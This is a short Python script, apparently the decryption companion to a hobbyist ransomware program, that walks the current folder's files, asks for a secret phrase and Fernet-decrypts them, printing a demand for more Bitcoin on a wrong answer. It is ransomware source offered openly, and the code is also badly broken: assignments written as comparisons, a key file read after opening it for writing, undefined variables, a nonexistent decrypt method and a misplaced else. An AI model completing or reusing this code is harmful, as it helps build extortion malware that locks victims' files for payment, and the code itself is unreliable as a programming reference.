import os
from cryptography.fernet import fernet
#lets find some files
files=[]
for file in os.listdir():
    if files=="Ramsoware.py" or file =="decrypter.py":
        continue
    if os.path.isfile(file):
        files.append(file)

        print(files)

        with open("thekey.key","wb") as key:
            secretkey =key.read()


        secretphrase =="coffee"

        user_phrase =input("Enter the secret phrase to decrypt your files\n")

        if user_phrase ==secretphrase:
            thekey.write(key)
            for file in files:
                with open(file,"rb") as thefile:                   
                    contents =thefile.read()
                    contents_decrypted +fernet(secretkey).decrypted(contents)
                    with open (file,"wb") as thefile:
                        thefile.write(contents_decrypted)
                    print("Congrats, you're files are decrypted. Enjoy your coffee")
else:
                        print("Sorry,wrong secret  phrase. send me more Bitcoin ")